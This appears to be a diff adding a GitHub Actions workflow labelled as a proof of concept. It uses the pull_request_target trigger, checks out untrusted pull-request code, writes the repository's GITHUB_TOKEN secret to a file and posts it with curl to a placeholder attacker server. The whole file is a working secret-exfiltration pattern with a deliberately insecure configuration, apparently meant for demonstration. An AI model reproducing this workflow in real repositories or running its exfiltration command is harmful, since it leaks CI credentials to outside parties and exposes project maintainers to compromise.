@@ -1,0 +1,21 @@
+name: vulnerable-poc
+
+on:
+  pull_request_target:
+
+jobs:
+  leak-secrets:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout PR code (dangerous!)
+        uses: actions/checkout@v3
+        with:
+          ref: ${{ github.event.pull_request.head.ref }}
+          repository: ${{ github.event.pull_request.head.repo.full_name }}
+
+      - name: Run malicious script from PR
+        run: |
+          echo "Leaking secret now..."
+          echo "SECRET GITHUB_TOKEN is: ${{ secrets.GITHUB_TOKEN }}" > secret.txt
+          # You can exfiltrate the secret by posting it to an external server (just an example)
+          curl -X POST -d @secret.txt https://attacker-server.example.com/receive
